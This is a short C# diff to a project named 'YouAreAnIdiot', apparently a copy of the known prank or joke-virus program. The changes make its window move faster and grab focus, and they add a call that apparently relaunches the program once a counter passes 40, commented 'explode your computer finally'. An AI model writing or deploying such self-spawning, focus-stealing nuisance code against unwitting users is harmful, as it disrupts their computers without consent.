@@ -13,13 +13,18 @@ namespace YouAreAnIdiot
         public Form1()
         {
             InitializeComponent();
-            Program.PlaySound();
-            if (Program.i > 1 && !Program.SafeMode)
+            //Program.PlaySound();
+            // "corrupt" the form
+            if (Program.i > 2 && !Program.SafeMode)
             {
                 InitializeMovement();
-                if (Program.i > 3)
+                if (Program.i > 4)
                 {
                     Program.FocusWindow = true;
+                    if (Program.i > 40) // explode your computer finally
+                    {
+                        Program.OpenItself();
+                    }
                 }
             }
         }
@@ -39,14 +44,14 @@ namespace YouAreAnIdiot
             var dy = _targetLocation.Y - Location.Y;
 
             // Move a small distance towards the target location
-            Location = new Point(Location.X + dx / 10, Location.Y + dy / 10);
+            Location = new Point(Location.X + dx / 5, Location.Y + dy / 5);
 
             // Always pick a new target location after moving
             _targetLocation = GetRandomLocation();
 
             if (Program.FocusWindow)
             {
-                Activate();
+                Activate(); // not working????
             }
         }
         private Point GetRandomLocation()
